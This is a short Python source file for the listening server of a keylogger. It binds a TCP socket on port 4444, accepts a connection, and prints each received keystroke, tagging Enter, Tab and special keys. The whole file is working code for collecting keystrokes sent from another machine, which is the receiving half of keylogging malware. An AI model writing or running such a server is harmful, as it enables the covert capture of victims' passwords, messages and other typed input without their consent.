import socket
import string


def start_keylog_server():
    while True: ##### SOCKET START LOOP
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = '0.0.0.0'
        port = 4444

        while True: ##### SOCKET CONNECTION LOOP
            try:
                server_socket.bind((host, port))
                server_socket.listen(1)
                print(f"Keylog server listening on {host}:{port}")
                client_socket, client_address = server_socket.accept()
                print(f"Connection from {client_address}")

                while True: ##### CHAR RECIEVING LOOP
                    char = client_socket.recv(1)
                    try: # Try treating the Character as ASCII, Looking for spaces, tabs and enters
                        char = char.decode('utf-8')
                        if char in string.printable:
                            if char.isprintable() and char not in string.whitespace:
                                print(f"{char}", end='', flush=True)
                            elif char == '\r':
                                print(f"\n<ENTER>")
                            elif char == '\t':
                                print(f"<TAB>", end='', flush=True)
                            else:
                                print(f"[{ord(char)}]", end='', flush=True)
                        else:
                            print(f"[{ord(char)}]", end='', flush=True)

                    except: # If it's a shift or another non-printable Key
                        print("__Special_Key__")
            except ConnectionResetError:
                print("\nConnection reset by client.")
                break
            except OSError:
                print("\nConnection reset by client.")
                break


if __name__ == "__main__":
    start_keylog_server()